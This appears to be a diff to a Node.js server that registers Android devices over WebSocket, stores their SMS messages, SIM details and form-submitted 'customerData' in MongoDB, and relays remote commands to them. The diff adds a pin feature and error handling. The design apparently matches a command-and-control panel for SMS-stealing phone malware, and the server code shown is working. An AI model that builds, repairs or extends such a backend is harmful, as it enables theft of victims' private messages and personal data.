@@ -14,7 +14,12 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });
 
-const MONGO_URI = process.env.MONGO_URI || '';
+let MONGO_URI = process.env.MONGO_URI || '';
+// Clean MONGO_URI from common env issues
+if (MONGO_URI) {
+    MONGO_URI = MONGO_URI.replace(/\\"/g, '').replace(/;/g, '').trim();
+}
+
 let dbConnected = false;
 
 if (!MONGO_URI) { 
@@ -24,6 +29,7 @@ if (!MONGO_URI) {
     mongoose.connect(MONGO_URI, {
       serverSelectionTimeoutMS: 5000,
       connectTimeoutMS: 10000,
+      writeConcern: { w: 1 } // Fixed: Use w: 1 to avoid replica set issues
     }).then(() => {
       dbConnected = true;
       console.log('✅ MongoDB connected successfully');
@@ -62,15 +68,8 @@ async function getDevicesFromStore() {
 
 async function findOneInStore(query) {
   if (dbConnected) return await Device.findOne(query).lean();
-  // Fallback memory logic...
   const keys = Object.keys(query);
   return clone(inMemoryDevices.find(d => keys.every(k => d[k] === query[k])) || null);
-}
-
-async function findOneAndUpdateInStore(query, update, opts) {
-  if (dbConnected) return await Device.findOneAndUpdate(query, update, opts);
-  // Fallback memory logic...
-  return null; 
 }
 
 const server = http.createServer(app);
@@ -113,20 +112,35 @@ app.post('/api/delete-device', async (req, res) => {
   } catch (err) { return res.status(500).json({ success: false }); }
 });
 
-app.post('/api/command', async (req, res) => {
-    // ... same command logic ...
-    const { deviceId, action, data } = req.body || {};
-    let device = await findOneInStore({ $or: [{ deviceId }, { serialNumber: deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] });
-    const clients = global.deviceSockets.get(deviceId) || global.deviceSockets.get(device?.deviceId);
+app.post('/api/pin-device', async (req, res) => {
+    try {
+        const { deviceId, status } = req.body || {};
+        if (dbConnected) {
+            await Device.findOneAndUpdate(
+                { $or: [{ deviceId }, { serialNumber: deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] },
+                { $set: { isPinned: !!status } }
+            );
+            io.emit('dashboard-update');
+            return res.json({ success: true });
+        }
+    } catch(e) { return res.status(500).json({ success: false }); }
+});
 
-    if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
-        if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
-        return res.json({ success: true, isOnline: !!(clients && clients.size > 0), device, messages: device.smsMessages, customerData: device.customerData });
-    }
-    
-    if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device Offline' });
-    clients.forEach(c => c.readyState === WebSocket.OPEN && c.send(JSON.stringify({ command: action, data })));
-    return res.json({ success: true, message: 'Command sent' });
+app.post('/api/command', async (req, res) => {
+    try {
+        const { deviceId, action, data } = req.body || {};
+        let device = await findOneInStore({ $or: [{ deviceId }, { serialNumber: deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] });
+        const clients = global.deviceSockets.get(deviceId) || global.deviceSockets.get(device?.deviceId);
+
+        if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
+            if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
+            return res.json({ success: true, isOnline: !!(clients && clients.size > 0), device, messages: device.smsMessages, customerData: device.customerData });
+        }
+        
+        if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device Offline' });
+        clients.forEach(c => { if(c.readyState === WebSocket.OPEN) c.send(JSON.stringify({ command: action, data })); });
+        return res.json({ success: true, message: 'Command sent' });
+    } catch(e) { return res.status(500).json({ success: false }); }
 });
 
 server.on('upgrade', (req, socket, head) => {
@@ -135,7 +149,7 @@ server.on('upgrade', (req, socket, head) => {
 });
 
 wss.on('connection', (ws, req) => {
-  console.log('📱 New Device attempting to connect...');
+  console.log('📱 New Device connection attempt');
   ws.isAlive = true;
   ws.on('pong', () => ws.isAlive = true);
   
@@ -145,7 +159,6 @@ wss.on('connection', (ws, req) => {
       const id = data.deviceId || data.serialNumber;
       if (!id) return;
 
-      console.log('📩 Data received from device:', id);
       ws.deviceId = id;
       if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
       global.deviceSockets.get(id).add(ws);
@@ -159,7 +172,7 @@ wss.on('connection', (ws, req) => {
               androidVersion: data.androidVersion,
               sim1: data.sim1,
               sim2: data.sim2,
-              battery: data.battery,
+              battery: Number(data.battery),
               serialNumber: data.serialNumber
           } 
       };
@@ -168,20 +181,20 @@ wss.on('connection', (ws, req) => {
       if (data.type === 'FORM_SUBMIT') update.$set.customerData = data.customerData;
 
       if (dbConnected) {
+          // Fixed upsert logic
           await Device.findOneAndUpdate(
             { $or: [{ deviceId: id }, { serialNumber: id }] },
-            { ...update, $setOnInsert: { registrationTimestamp: new Date(), isDeleted: false } },
-            { upsert: true }
+            { ...update, $setOnInsert: { registrationTimestamp: new Date(), isDeleted: false, isPinned: false } },
+            { upsert: true, writeConcern: { w: 1 } }
           );
           io.emit('dashboard-update');
       }
-    } catch (e) { console.error('Error processing ws message:', e); }
+    } catch (e) { console.error('Error processing ws message:', e.message); }
   });
 
   ws.on('close', () => {
     if (ws.deviceId && global.deviceSockets.has(ws.deviceId)) {
         global.deviceSockets.get(ws.deviceId).delete(ws);
-        console.log('📱 Device disconnected:', ws.deviceId);
     }
   });
 });
